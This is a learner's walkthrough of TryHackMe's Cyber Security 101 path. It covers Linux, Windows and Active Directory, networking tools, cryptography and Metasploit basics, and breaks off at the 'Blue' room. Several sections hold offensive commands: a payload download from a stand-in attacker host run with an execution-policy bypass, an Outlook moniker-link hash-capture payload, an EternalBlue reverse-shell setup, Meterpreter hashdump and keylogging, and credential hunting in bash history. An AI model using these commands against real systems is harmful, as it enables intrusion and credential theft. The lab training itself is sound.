# TryHackMe — Cyber Security 101 Path Writeup

**Platform:** TryHackMe  
**Path:** [Cyber Security 101](https://tryhackme.com/path/outline/cybersecurity101)  
**Difficulty:** Easy  
**Status:** ✅ Completed  
**Profile:** [gresium](https://tryhackme.com/p/gresium)  
**Date Completed:** 5 April 2026
**Total Rooms:** 56 across 14 sections  
**Estimated Time:** ~46h  

---

## Summary

Cyber Security 101 is TryHackMe's core entry-level path covering the full spectrum of offensive and defensive security. It goes significantly deeper than Pre Security — moving from understanding technology to actually using security tools, exploiting real vulnerabilities, and operating both as an attacker and a defender. This path is where the fundamentals become skills.

---

---

## Section 1 — Start Your Cyber Security Journey

> Goal: Frame the field — what offensive and defensive security mean, and how to find information effectively.

---

### Room 1 — Offensive Security Intro
🔗 https://tryhackme.com/room/offensivesecurityintro

**Key Concepts:**
- Offensive security = legally simulating attacks to find vulnerabilities before malicious actors do
- Common roles: Penetration Tester, Red Teamer, Bug Bounty Hunter
- Basic methodology: recon → identify attack surface → exploit → report

**What I did:**
Used GoBuster to brute-force hidden directories on a target web application. Found a hidden `/bank-transfer` admin page not linked from the main site and performed an unauthorised transfer to demonstrate the vulnerability.

```bash
gobuster dir -u http://fakebank.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Takeaways:**
Security through obscurity fails immediately against directory brute-forcing. An unlinked page is not a protected page. This introduces the core offensive mindset: attackers don't need invitations, they probe for what's hidden.

---

### Room 2 — Defensive Security Intro
🔗 https://tryhackme.com/room/defensivesecurityintro

**Key Concepts:**
- Defensive security = preventing, detecting, and responding to attacks
- Key functions: threat intelligence, SOC monitoring, DFIR, malware analysis
- SIEM: collects and correlates logs from across an environment to surface suspicious activity
- Blue team roles are as technical as red team — pattern recognition and log analysis are core skills

**What I did:**
Worked through a SOC analyst simulation — reviewed SIEM alerts, matched suspicious IPs against threat intelligence feeds, identified a brute-force login attempt, and escalated the incident through the correct response workflow.

**Takeaways:**
Defensive security is not passive. Threat hunting means actively looking for attackers who have already bypassed perimeter defences. Understanding attack techniques (offensive knowledge) makes you a significantly better defender.

---

### Room 3 — Search Skills
🔗 https://tryhackme.com/room/searchskills

**Key Concepts:**
- Effective searching is a core professional skill — knowing where to look and what to search for
- Google dorking: using advanced operators to find specific information
  - `site:` — restrict results to a domain
  - `filetype:` — find specific file types
  - `intitle:` — search page titles
  - `inurl:` — search URL strings
- OSINT sources: Shodan, Censys, VirusTotal, ExploitDB, CVE databases, GitHub
- Exploit-DB: `searchsploit` CLI tool searches the local exploit database

**What I did:**
Ran Google dork queries to find exposed configuration files and admin panels. Used `searchsploit` to find public exploits for a given software version. Queried Shodan to identify internet-facing services on a target organisation.

```bash
searchsploit vsftpd 2.3.4
searchsploit -m 49757    # copy exploit to current directory
```

**Takeaways:**
Passive reconnaissance using Google dorks and Shodan can reveal massive amounts of information about a target before touching a single packet they can log. `searchsploit` is faster than browsing ExploitDB when you already know the software version.

---

---

## Section 2 — Linux Fundamentals

> Goal: Get genuinely comfortable in Linux — the primary operating environment for both attack and defence work.

---

### Room 4 — Linux Fundamentals Part 1
🔗 https://tryhackme.com/room/linuxfundamentalspart1

**Key Concepts:**
- Linux filesystem hierarchy: `/` (root), `/home`, `/etc`, `/var`, `/tmp`, `/bin`, `/usr/bin`
- Everything in Linux is a file — including devices and processes
- Basic navigation: `ls`, `cd`, `pwd`, `cat`, `echo`, `whoami`, `id`
- Flags and switches: `ls -la`, `cat -n`
- Manual pages: `man <command>` — documentation for every command

**What I did:**
Connected to a remote Linux machine via the in-browser terminal. Navigated the filesystem, read files with `cat`, used `ls -la` to view hidden files and permissions, and looked up command syntax with `man`.

```bash
ls -la /home/
cat /etc/passwd
echo "Hello" > test.txt
man ls
whoami
id
```

**Takeaways:**
`ls -la` shows hidden files (dotfiles) and permissions in one command — these two pieces of information are critical during enumeration. The `/etc/passwd` file contains all system users and their home directories, which is always one of the first files to read on a new machine.

---

### Room 5 — Linux Fundamentals Part 2
🔗 https://tryhackme.com/room/linuxfundamentalspart2

**Key Concepts:**
- File permissions: read (r=4), write (w=2), execute (x=1) for owner/group/others
- `chmod`, `chown`: modify permissions and ownership
- Operators: `>` (overwrite), `>>` (append), `|` (pipe), `&&` (chain commands)
- Searching: `grep`, `find`
- Process management: `ps`, `top`, `kill`
- SSH: `ssh user@ip` — remote terminal access

**What I did:**
Used `find` to locate files by name, type, and permission. Chained commands with pipes to filter grep output. Connected to the target via SSH. Changed file permissions and tested access before and after.

```bash
find / -name passwords.txt 2>/dev/null
find / -perm -4000 2>/dev/null          # SUID files
grep -r "THM" /home/ 2>/dev/null
ps aux
kill -9 <PID>
ssh user@10.10.x.x
```

**Takeaways:**
`find / -perm -4000 2>/dev/null` is one of the first privilege escalation checks on any Linux machine — SUID binaries run as their owner (often root) regardless of who executes them. Suppressing errors with `2>/dev/null` keeps output clean.

---

### Room 6 — Linux Fundamentals Part 3
🔗 https://tryhackme.com/room/linuxfundamentalspart3

**Key Concepts:**
- Text editors: `nano` (beginner-friendly), `vim` (powerful, modal)
- Package management: `apt install`, `apt update`, `apt upgrade` (Debian/Ubuntu)
- Service management: `systemctl start/stop/enable/status <service>`
- Cron jobs: scheduled task automation — `crontab -e` to edit, syntax: `* * * * * command`
- Log files: `/var/log/` — `auth.log`, `syslog`, `apache2/access.log`
- Setting up a web server: `python3 -m http.server 8080`

**What I did:**
Installed packages with `apt`. Started and stopped services with `systemctl`. Wrote a cron job to run a script on a schedule. Read through auth logs to identify login attempts. Hosted a simple Python HTTP server to transfer files.

```bash
systemctl start apache2
systemctl status ssh
crontab -e
# */5 * * * * /home/user/backup.sh
tail -f /var/log/auth.log
python3 -m http.server 8000
```

**Takeaways:**
`python3 -m http.server` is used constantly in CTFs and real assessments to serve files from the attacker machine. Cron jobs are a common persistence mechanism — and a privesc vector if a root-owned cron job executes a user-writable script.

---

---

## Section 3 — Windows and AD Fundamentals

> Goal: Understand Windows internals and Active Directory — the dominant enterprise environment.

---

### Room 7 — Windows Fundamentals 1
🔗 https://tryhackme.com/room/windowsfundamentals1xbx

**Key Concepts:**
- Windows filesystem: `C:\` as root drive, key paths: `C:\Windows\System32`, `C:\Users`, `C:\Program Files`
- Windows editions: Home, Pro, Enterprise — different feature sets and management capabilities
- Desktop, taskbar, Start menu navigation
- File Explorer: viewing files, hidden items, extensions
- NTFS permissions: Full Control, Modify, Read & Execute, Read, Write — can be set on files and folders
- User Account Control (UAC): prompts for elevation — prevents silent privilege escalation

**What I did:**
Navigated the Windows filesystem via File Explorer and checked NTFS permissions on key directories. Enabled showing hidden files and file extensions. Reviewed UAC behaviour when launching administrative tools.

**Takeaways:**
NTFS permissions are separate from share permissions — both apply when accessing files over a network, and the most restrictive set wins. Knowing where to find things in the filesystem (`C:\Windows\System32\config\SAM` for the password database, for example) matters for post-exploitation.

---

### Room 8 — Windows Fundamentals 2
🔗 https://tryhackme.com/room/windowsfundamentals2x0x

**Key Concepts:**
- System Configuration (msconfig): manage boot options, services, startup items
- Computer Management: access Device Manager, Disk Management, Services, Event Viewer
- System Information (msinfo32): full hardware and software inventory
- Resource Monitor: real-time CPU, memory, disk, and network usage per process
- Windows Registry: hierarchical database — hives: HKLM (system-wide), HKCU (current user), HKCR, HKU, HKCC
- Registry editor: `regedit`

**What I did:**
Used `msconfig` to review boot options and startup programs. Opened `regedit` and explored key hives — found autorun entries under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. Used `msinfo32` to generate a system inventory.

**Takeaways:**
The `Run` and `RunOnce` registry keys are where persistence lives on Windows — malware adds entries here to survive reboots. This is one of the first places to check during incident response and one of the most common persistence mechanisms to document in a pentest report.

---

### Room 9 — Windows Fundamentals 3
🔗 https://tryhackme.com/room/windowsfundamentals3xzx

**Key Concepts:**
- Windows Update: patch management — critical for closing known vulnerabilities
- Windows Security / Defender: built-in AV and security dashboard
- BitLocker: full-disk encryption — protects data at rest
- Windows Firewall: filters inbound/outbound traffic by rules
- Volume Shadow Copies (VSS): point-in-time snapshots — useful for recovery, also exploited by ransomware
- Windows Defender Credential Guard: protects LSASS from credential dumping

**What I did:**
Reviewed the Windows Security dashboard. Examined firewall rules (inbound/outbound) and identified which ports were explicitly allowed. Reviewed BitLocker status on drives. Explored VSS snapshots — understood why ransomware deletes them before encrypting files.

**Takeaways:**
VSS deletion (`vssadmin delete shadows /all /quiet`) is one of the most consistent ransomware behaviours — if you see this command in logs or an EDR alert, ransomware deployment is likely already in progress. Credential Guard prevents pass-the-hash and Mimikatz from extracting NTLM hashes from memory.

---

### Room 10 — Active Directory Basics
🔗 https://tryhackme.com/room/winadbasics

**Key Concepts:**
- Active Directory (AD): Microsoft's centralised identity and access management system — used in virtually every enterprise
- Domain Controller (DC): server that hosts AD and authenticates users
- Objects: Users, Computers, Groups, OUs (Organisational Units), GPOs (Group Policy Objects)
- Authentication protocols: Kerberos (modern, ticket-based), NTLM (legacy, challenge-response)
- Kerberos tickets: TGT (Ticket Granting Ticket) from KDC, then service tickets for specific resources
- Trust relationships: allow users in one domain to authenticate to resources in another

**What I did:**
Explored an AD environment — browsed users and groups in Active Directory Users and Computers (ADUC). Created OUs and applied GPOs. Reviewed Kerberos authentication flow and how a TGT is obtained and used to request service tickets.

**Takeaways:**
AD is the primary attack surface in enterprise pentesting. Kerberoasting, Pass-the-Hash, Pass-the-Ticket, DCSync, and BloodHound enumeration all depend on understanding how AD works. The DC is the highest-value target in any Windows domain — owning it means owning the organisation.

---

---

## Section 4 — Command Line

> Goal: Develop real command-line fluency on both Windows and Linux.

---

### Room 11 — Windows Command Line
🔗 https://tryhackme.com/room/windowscommandline

**Key Concepts:**
- CMD is the legacy Windows shell — still relevant for basic tasks and older environments
- Navigation: `dir`, `cd`, `md`, `rd`, `copy`, `move`, `del`, `type`
- System info: `systeminfo`, `ipconfig /all`, `netstat -ano`, `tasklist`
- User management: `net user`, `net localgroup`
- Network: `ping`, `tracert`, `nslookup`, `arp -a`
- Scripting: `.bat` batch files

**What I did:**
Enumerated a Windows system entirely from CMD — gathered system info, listed running processes and network connections, identified logged-in users and local groups. Traced the network path to an external host with `tracert`.

```cmd
systeminfo
ipconfig /all
netstat -ano
tasklist /v
net user
net localgroup administrators
arp -a
tracert 8.8.8.8
type C:\Users\user\Desktop\flag.txt
```

**Takeaways:**
`netstat -ano` shows all active connections with the PID responsible — this is how you identify suspicious outbound connections during incident response. `net localgroup administrators` shows who has local admin — a critical check in any post-exploitation enumeration.

---

### Room 12 — Windows PowerShell
🔗 https://tryhackme.com/room/windowspowershell

**Key Concepts:**
- PowerShell: modern Windows shell with object-based pipeline and full .NET access
- Cmdlets follow Verb-Noun naming: `Get-Process`, `Set-Location`, `Invoke-WebRequest`
- Pipeline: pass objects (not just text) between cmdlets — `Get-Process | Sort-Object CPU -Descending`
- Key cmdlets: `Get-ChildItem`, `Get-Content`, `Select-String`, `Get-Service`, `Get-LocalUser`
- Execution policy: `Bypass`, `Restricted`, `RemoteSigned` — controls script execution
- Remoting: `Enter-PSSession -ComputerName target` — PowerShell over the network

**What I did:**
Used PowerShell to enumerate users, services, processes, and network connections. Downloaded a file from a remote server with `Invoke-WebRequest`. Bypassed execution policy to run a script.

```powershell
Get-LocalUser
Get-LocalGroup
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
Invoke-WebRequest -Uri http://attacker.thm/shell.ps1 -OutFile shell.ps1
powershell -ep bypass -f shell.ps1
Select-String -Path C:\*.txt -Pattern "password"
```

**Takeaways:**
PowerShell is the attacker's best friend on Windows — it can download payloads, enumerate AD, execute shellcode in memory, and exfiltrate data, all using built-in OS functionality. `Select-String` (PS equivalent of `grep`) finds credentials in files quickly.

---

### Room 13 — Linux Shells
🔗 https://tryhackme.com/room/linuxshells

**Key Concepts:**
- Shell types: sh, bash, zsh, fish — bash is the most common in security contexts
- Shell scripting: variables, conditionals, loops, functions in bash
- Environment variables: `$PATH`, `$HOME`, `$USER`, `export VARIABLE=value`
- Shell history: `~/.bash_history` — records commands (a forensic goldmine)
- Aliases: `alias ll='ls -la'`
- Customisation: `.bashrc`, `.bash_profile` — executed on shell start

**What I did:**
Wrote bash scripts — a simple port checker, a directory brute-forcer loop, and a file searcher. Reviewed environment variables. Read `.bash_history` to find previously run commands revealing credentials.

```bash
#!/bin/bash
for port in 22 80 443 8080; do
  (echo >/dev/tcp/target/$port) 2>/dev/null && echo "$port open" || echo "$port closed"
done

# Check history for credentials
cat ~/.bash_history | grep -i "password\|passwd\|ssh\|mysql"

# Export custom path
export PATH=$PATH:/opt/tools/bin
```

**Takeaways:**
`.bash_history` files regularly contain cleartext credentials — SSH commands with passwords, MySQL connections with `-p`, curl commands with API keys. It's one of the first files to read after gaining access to a Linux machine. Admins often forget it's there.

---

---

## Section 5 — Networking

> Goal: Understand network protocols deeply and use traffic analysis tools.

---

### Room 14 — Networking Concepts
🔗 https://tryhackme.com/room/networkingconcepts

**Key Concepts:**
- OSI model: 7 layers — Physical, Data Link, Network, Transport, Session, Presentation, Application
- TCP/IP model: 4 layers — Network Access, Internet, Transport, Application
- IP addressing: IPv4 (32-bit), IPv6 (128-bit), subnetting with CIDR notation
- Routing: how packets move across networks via routers using routing tables
- Common protocols by layer: ARP (L2), IP/ICMP (L3), TCP/UDP (L4), HTTP/DNS/SSH (L7)
- `telnet` for raw protocol testing: `telnet target 80` then `GET / HTTP/1.1`

**What I did:**
Used `telnet` to manually send HTTP requests and interact with raw services. Traced a packet's route using `traceroute`. Reviewed routing tables. Queried an ARP cache to map IPs to MACs on the local network.

```bash
telnet target.thm 80
# GET / HTTP/1.1
# Host: target.thm

traceroute tryhackme.com
ip route
arp -a
```

**Takeaways:**
Telnet is a great way to understand what a protocol actually looks like at the wire level before tools abstract it. Understanding routing tables is essential for pivoting — when you compromise a host, its routing table tells you which networks it can reach.

---

### Room 15 — Networking Essentials
🔗 https://tryhackme.com/room/networkingessentials

**Key Concepts:**
- DHCP: Dynamic Host Configuration Protocol — automatically assigns IP, gateway, DNS to devices
  - DORA: Discover → Offer → Request → Acknowledge
- DNS: resolves domain names to IPs — UDP port 53 (TCP for large responses/zone transfers)
- NAT: translates private IPs to public IPs at the router boundary
- Routing protocols: RIP, OSPF, BGP — how routers share route information
- `tshark`: CLI packet capture tool — Wireshark from the command line

**What I did:**
Analysed a DHCP packet capture with `tshark` — identified the 4-step DORA process. Traced a DNS query and response. Reviewed how NAT allows an entire home network to share one public IP.

```bash
tshark -r capture.pcap -n
tshark -r capture.pcap -Y "dhcp"
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
```

**Takeaways:**
DHCP can be abused — a rogue DHCP server can redirect traffic through an attacker machine by handing out a malicious gateway (DHCP starvation + rogue DHCP). DNS over UDP means it's easy to spoof responses if you're on the same network.

---

### Room 16 — Networking Core Protocols
🔗 https://tryhackme.com/room/networkingcoreprotocols

**Key Concepts:**
- HTTP/HTTPS: web traffic — port 80/443
- FTP: file transfer — port 21 (control), 20 (data) — credentials sent in cleartext
- SMTP: email sending — port 25/587
- POP3/IMAP: email retrieval — ports 110/143 and 993/995
- SSH: encrypted remote shell — port 22
- RDP: Windows remote desktop — port 3389
- SMB: Windows file sharing — port 445

**What I did:**
Connected to services using appropriate clients — `ftp`, `ssh`, `curl` for HTTP. Observed cleartext FTP credentials in a packet capture. Used `smbclient` to list shares on a target. Sent a test email via `telnet` to port 25.

```bash
ftp target.thm
# USER admin
# PASS password123

smbclient -L //target.thm -N
curl -v http://target.thm/
ssh user@target.thm
```

**Takeaways:**
FTP, Telnet, and basic SMTP transmit credentials in cleartext — trivially captured with Wireshark on the same network. SMB is one of the most attacked protocols in Windows environments — EternalBlue (MS17-010) and credential relay attacks (NTLM relay) both target it.

---

### Room 17 — Networking Secure Protocols
🔗 https://tryhackme.com/room/networkingsecureprotocols

**Key Concepts:**
- TLS (Transport Layer Security): encrypts traffic — used by HTTPS, SMTPS, IMAPS, FTPS
- TLS handshake: cipher negotiation → certificate exchange → key exchange → session keys
- Certificates: issued by CAs (Certificate Authorities), contain public key and identity info
- SFTP vs FTPS: SFTP runs over SSH (port 22), FTPS runs FTP over TLS
- VPN protocols: OpenVPN, WireGuard, IPSec
- SSH key authentication: more secure than passwords — private key stays local, public key on server

**What I did:**
Set up SSH key authentication — generated a key pair, copied the public key to the server, and authenticated without a password. Examined a TLS certificate with OpenSSL. Compared encrypted vs unencrypted traffic in Wireshark.

```bash
ssh-keygen -t ed25519 -C "gresium@thm"
ssh-copy-id user@target.thm
openssl s_client -connect target.thm:443
openssl x509 -in cert.pem -text -noout
```

**Takeaways:**
SSH key auth eliminates the password brute-force attack surface. In pentesting, finding a private key (`id_rsa`) on a compromised machine often gives you access to other machines that trust it — always check `~/.ssh/` after gaining access.

---

### Room 18 — Wireshark: The Basics
🔗 https://tryhackme.com/room/wiresharkthebasics

**Key Concepts:**
- Wireshark: GUI packet capture and analysis tool
- Capture filters (BPF syntax): applied during capture to limit what's recorded
- Display filters: applied after capture to narrow what's shown
- Common display filters:
  - `http` — show HTTP traffic
  - `tcp.port == 80` — filter by port
  - `ip.addr == 192.168.1.1` — filter by IP
  - `http.request.method == "POST"` — filter POST requests
- Following streams: right-click → Follow → TCP Stream to see full conversation
- Export objects: extract files from HTTP streams

**What I did:**
Loaded a packet capture and applied display filters to isolate HTTP, DNS, and FTP traffic. Followed TCP streams to read HTTP conversations in plaintext. Extracted credentials from a cleartext FTP session. Exported a file transferred over HTTP.

**Takeaways:**
"Follow TCP Stream" is the most useful Wireshark feature in CTFs — it reconstructs conversations you can read. Exporting HTTP objects (File → Export Objects → HTTP) recovers files transferred over unencrypted connections. This is the core tool for network forensics.

---

### Room 19 — Tcpdump: The Basics
🔗 https://tryhackme.com/room/tcpdump

**Key Concepts:**
- Tcpdump: CLI packet capture tool — runs without a GUI, essential for remote capture
- Capture to file: `-w output.pcap`
- Read from file: `-r input.pcap`
- BPF filters: `host`, `port`, `net`, `proto`, `src`, `dst`
- `-n`: don't resolve hostnames (faster)
- `-v`, `-vv`, `-vvv`: verbosity levels for header detail
- `-A`: print packet content as ASCII
- `-X`: print hex and ASCII

**What I did:**
Captured live traffic filtered by host and port. Read a saved pcap and filtered for specific protocols. Printed packet payloads in ASCII to extract cleartext data. Combined filters using `and`/`or`.

```bash
tcpdump -i eth0 -w capture.pcap
tcpdump -r capture.pcap -n host 10.10.10.1 and port 80
tcpdump -r capture.pcap -A -n 'tcp port 21'
tcpdump -i eth0 -n 'not port 22'    # capture everything except SSH
```

**Takeaways:**
Tcpdump is essential when you're on a remote machine with no GUI. The `-A` flag makes credential extraction from cleartext protocols trivial — one command and you're reading FTP logins. `not port 22` prevents the capture from flooding with your own SSH session traffic.

---

### Room 20 — Nmap: The Basics
🔗 https://tryhackme.com/room/nmap

**Key Concepts:**
- Nmap: the standard port scanner — used in every engagement
- Scan types:
  - `-sS`: SYN scan (stealth, most common) — requires root
  - `-sT`: TCP connect scan — no root required
  - `-sU`: UDP scan
  - `-sV`: service/version detection
  - `-sC`: default NSE scripts
  - `-O`: OS detection
  - `-A`: all of the above
- Timing templates: `-T0` (slowest) to `-T5` (fastest) — `-T4` is standard
- Port ranges: `-p 80`, `-p 1-1000`, `-p-` (all 65535)
- Output formats: `-oN` (normal), `-oX` (XML), `-oG` (grepable), `-oA` (all three)

**What I did:**
Ran progressively detailed scans on a target — from a quick ping sweep to a full service version scan with NSE scripts. Saved output in all formats. Used `--script vuln` to check for known vulnerabilities.

```bash
nmap -sn 10.10.10.0/24                      # ping sweep / host discovery
nmap -sS -p- -T4 target.thm                 # full SYN scan
nmap -sV -sC -p 22,80,443 target.thm        # version + scripts on key ports
nmap -A -T4 -oA scan_results target.thm     # full scan, save all formats
nmap --script vuln target.thm               # vulnerability scripts
```

**Takeaways:**
`-sV -sC -p-` is the standard initial scan on any CTF or pentest target. The version detection output directly feeds into `searchsploit` — you find the version with nmap and search for exploits with searchsploit. Always save output with `-oA` so you can grep results later.

---

---

## Section 6 — Cryptography

> Goal: Understand how cryptography works and how to attack weak implementations.

---

### Room 21 — Cryptography Basics
🔗 https://tryhackme.com/room/cryptographybasics

**Key Concepts:**
- Symmetric encryption: same key for encrypt/decrypt — AES (128/256-bit), DES (broken), 3DES
- Block ciphers vs stream ciphers: block ciphers operate on fixed-size chunks (AES block = 128 bits)
- Cipher modes: ECB (broken — identical blocks produce identical ciphertext), CBC, CTR, GCM
- Key exchange problem: how do two parties agree on a symmetric key over an untrusted channel?
- Perfect Forward Secrecy (PFS): new session keys for every connection — past sessions safe if key is compromised

**What I did:**
Encrypted and decrypted messages with OpenSSL using AES. Compared ECB vs CBC mode encryption of the same data — demonstrated ECB's pattern leakage. Traced the Diffie-Hellman key exchange algorithm.

```bash
openssl enc -aes-256-cbc -in plain.txt -out cipher.bin -k "mysecretkey" -pbkdf2
openssl enc -d -aes-256-cbc -in cipher.bin -out decrypted.txt -k "mysecretkey" -pbkdf2
```

**Takeaways:**
ECB mode should never be used — it encrypts identical plaintext blocks identically, leaking structure (the "ECB penguin" visualisation makes this obvious). AES-256-GCM is the current standard for symmetric encryption as it also provides integrity checking.

---

### Room 22 — Public Key Cryptography Basics
🔗 https://tryhackme.com/room/publickeycrypto

**Key Concepts:**
- Asymmetric cryptography: public key encrypts, private key decrypts — or private key signs, public key verifies
- RSA: based on difficulty of factoring large integers — key sizes 2048/4096 bits
- Elliptic Curve Cryptography (ECC): smaller key sizes for equivalent security (256-bit ECC ≈ 3072-bit RSA)
- Diffie-Hellman key exchange: allows two parties to agree on a shared secret over a public channel
- Digital signatures: `hash(data)` encrypted with private key — proves authenticity and integrity
- PGP/GPG: OpenPGP implementation for encrypting emails and files

**What I did:**
Generated RSA and ECC key pairs with OpenSSL and GPG. Encrypted a file for a recipient using their public key. Signed a message and verified the signature. Traced the Diffie-Hellman exchange step by step.

```bash
gpg --full-gen-key
gpg --export --armor user@thm.local > public.key
gpg --import recipient.key
gpg --encrypt --recipient recipient@thm.local file.txt
gpg --sign message.txt
gpg --verify message.txt.sig
```

**Takeaways:**
RSA private keys found on compromised systems can decrypt all traffic that was encrypted to that key (if PFS wasn't used). This is why PFS matters — even if you capture and later steal the private key, you can't decrypt past sessions if ephemeral DH was used.

---

### Room 23 — Hashing Basics
🔗 https://tryhackme.com/room/hashingbasics

**Key Concepts:**
- Hash function: one-way transformation producing a fixed-length digest
- Properties: deterministic, fast to compute, infeasible to reverse, collision-resistant
- Common algorithms: MD5 (128-bit, broken), SHA-1 (160-bit, broken for signing), SHA-256, SHA-512, bcrypt, scrypt, Argon2
- Salting: random value prepended/appended before hashing — prevents rainbow table attacks
- Password storage: passwords should be hashed with a slow algorithm (bcrypt/Argon2) + salt, never plaintext or fast hashes
- Hash identification: by length — MD5=32 hex, SHA-1=40 hex, SHA-256=64 hex

**What I did:**
Generated hashes of strings with various algorithms and observed the avalanche effect (one character change = completely different hash). Identified hash types by length. Used an online hash lookup to crack an MD5 hash. Verified a file's integrity by comparing SHA-256 hashes.

```bash
echo -n "password" | md5sum          # 5f4dcc3b5aa765d61d8327deb882cf99
echo -n "password" | sha256sum
echo -n "password" | sha512sum
sha256sum file.iso                    # verify download integrity
```

**Takeaways:**
MD5 and SHA-1 are cryptographically broken — collisions can be engineered. For password storage, fast hashes (MD5, SHA-256) are dangerous because they can be computed at billions per second by a GPU. Bcrypt is deliberately slow and includes a built-in salt.

---

### Room 24 — John the Ripper: The Basics
🔗 https://tryhackme.com/room/johntheripperbasics

**Key Concepts:**
- John the Ripper (JtR): password hash cracking tool
- Attack modes: wordlist (dictionary), rules (mutations), brute force, incremental
- Hash identification: `john --list=formats`, or use `hash-identifier` / `hashid`
- Wordlists: `/usr/share/wordlists/rockyou.txt` — the standard starting point
- Rules: `--rules=jumbo` applies common password mutations (l33tspeak, capitalisation, appended numbers)
- Cracking specific formats: `--format=raw-md5`, `--format=bcrypt`, `--format=NT`

**What I did:**
Cracked MD5, SHA-1, NTLM, and bcrypt hashes from a wordlist. Applied john rules to extend the wordlist with common mutations. Cracked a password-protected ZIP file using `zip2john`.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=jumbo hashes.txt
john --format=raw-md5 --wordlist=rockyou.txt md5hashes.txt
john --show hashes.txt                    # display cracked passwords

# Crack zip password
zip2john protected.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
```

**Takeaways:**
The vast majority of real-world password cracking successes come from rockyou.txt with basic rules, not GPU brute force. Most users pick predictable passwords that are already in the wordlist or reachable with simple mutations. `--rules=jumbo` adds significantly more coverage with minimal extra time.

---

---

## Section 7 — Exploitation Basics

> Goal: Use real exploitation frameworks and tools to compromise vulnerable systems.

---

### Room 25 — Moniker Link (CVE-2024-21413)
🔗 https://tryhackme.com/room/monikerlink

**Key Concepts:**
- CVE-2024-21413: Microsoft Outlook Remote Code Execution vulnerability
- Moniker links: special URI syntax (e.g. `file://`, `!` prefix) that bypasses Outlook's Protected View
- Exploitation flow: attacker sends crafted email → victim previews it → Outlook resolves the moniker link → attacker receives NTLM hash / achieves RCE
- NTLM hash capture: attacker runs Responder to catch the hash when Outlook connects back
- Impact: unauthenticated RCE via email preview — no click required, just opening/previewing the email

**What I did:**
Set up Responder on the attacker machine to capture NTLM hashes. Crafted a malicious email containing a Moniker Link payload. Sent it to the target Outlook client. Captured the NTLMv2 hash when the victim previewed the message. Attempted to crack or relay the hash.

```bash
# Start Responder to capture NTLM auth
sudo responder -I eth0 -v

# Moniker link payload in email body (hyperlink target):
# file://attacker-ip/share/file.docx!exploit
```

**Takeaways:**
This CVE is a reminder that the email client itself is an attack surface, not just attachments. NTLMv2 hashes captured via Responder can be cracked offline with hashcat or relayed with ntlmrelayx to authenticate to other services. Patch Outlook.

---

### Room 26 — Metasploit: Introduction
🔗 https://tryhackme.com/room/metasploitintro

**Key Concepts:**
- Metasploit Framework: the industry-standard exploitation framework
- Components: msfconsole (main interface), modules (exploits, payloads, auxiliary, post, encoders)
- Module types:
  - Exploit: code that triggers a vulnerability
  - Payload: code that runs after exploitation (shell, Meterpreter)
  - Auxiliary: scanners, fuzzers, brute-forcers
  - Post: post-exploitation modules
- Key commands: `search`, `use`, `info`, `show options`, `set`, `run`/`exploit`
- LHOST/LPORT: attacker IP and port for reverse shells

**What I did:**
Launched `msfconsole`. Searched for a module by CVE number. Set all required options (RHOSTS, LHOST, LPORT, payload). Verified the setup with `show options` and ran the exploit.

```
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.x.x
set LHOST 10.10.y.y
set payload windows/x64/shell/reverse_tcp
run
```

**Takeaways:**
Metasploit reduces exploitation to configuration — the real skill is knowing which module to use, understanding why it works, and recognising when it won't (patched, wrong architecture, AV detection). Always run `show options` before exploiting to make sure nothing is unset.

---

### Room 27 — Metasploit: Exploitation
🔗 https://tryhackme.com/room/metasploitexploitation

**Key Concepts:**
- Exploit ranking: ExcellentRanking > GreatRanking > GoodRanking — higher = more reliable and stable
- Multi/handler: listener for reverse shells — `use exploit/multi/handler`
- Database integration: `msfdb init`, `db_nmap`, `hosts`, `services`, `vulns`
- Workspace management: organise findings by engagement with `workspace`
- Running nmap through Metasploit: `db_nmap -sV -sC target` — results stored in DB

**What I did:**
Initialised the Metasploit database and ran a scan via `db_nmap` to populate hosts and services. Created a workspace for the engagement. Selected an exploit based on the identified service version, ran it, and obtained a shell. Used `sessions -l` to manage multiple sessions.

```
msfdb init
msfconsole
workspace -a thm_lab
db_nmap -sV -sC 10.10.x.x
hosts
services
sessions -l
sessions -i 1
```

**Takeaways:**
The Metasploit database makes multi-target engagements manageable — you can run scans, track which hosts have been exploited, and store vulnerability data all in one place. The `multi/handler` module is used constantly when delivering payloads generated with `msfvenom`.

---

### Room 28 — Metasploit: Meterpreter
🔗 https://tryhackme.com/room/meterpreter

**Key Concepts:**
- Meterpreter: advanced in-memory payload — more capable than a basic shell
- Runs entirely in memory — no file written to disk (harder to detect with AV)
- Key Meterpreter commands:
  - `sysinfo`, `getuid`, `getpid` — system info
  - `upload`, `download` — file transfer
  - `shell` — drop into OS shell
  - `hashdump` — dump password hashes
  - `getsystem` — attempt privilege escalation
  - `run post/multi/recon/local_exploit_suggester` — suggest local privesc exploits
  - `migrate <PID>` — move to a different process
  - `background` — background the session
  - `keyscan_start` / `keyscan_dump` — keylogger

**What I did:**
Obtained a Meterpreter session. Ran `sysinfo` and `getuid`. Used `getsystem` to escalate to SYSTEM. Ran `hashdump` to extract NTLM hashes. Migrated to a more stable process. Downloaded a target file. Ran the local exploit suggester for additional privesc options.

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
meterpreter > hashdump
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > migrate 1234
meterpreter > download C:\\Users\\Administrator\\Desktop\\flag.txt
```

**Takeaways:**
`hashdump` gives you NTLM hashes that can be cracked with hashcat or used directly in pass-the-hash attacks. Process migration matters — migrating to a stable process like `explorer.exe` or `svchost.exe` prevents your session dying when the exploited process closes.

---

### Room 29 — Blue
🔗 https://tryhackme.com/room/blue

**Key Concepts:**
- MS17-010 (EternalBlue): Critical SMB vulnerability — allows remote code execution on unpatched Windows 7/Server 2008
- Exploit was developed by NSA, leaked by Shadow Brokers in 2017, weaponised by WannaCry ransomware
- Attack: sends specially crafted SMB packets → buffer overflow → SYSTEM shell
- No authentication required — just a reachable port 445
- Post-exploitation: hashdump, pass-the-hash, flag retrieval

**What I did:**
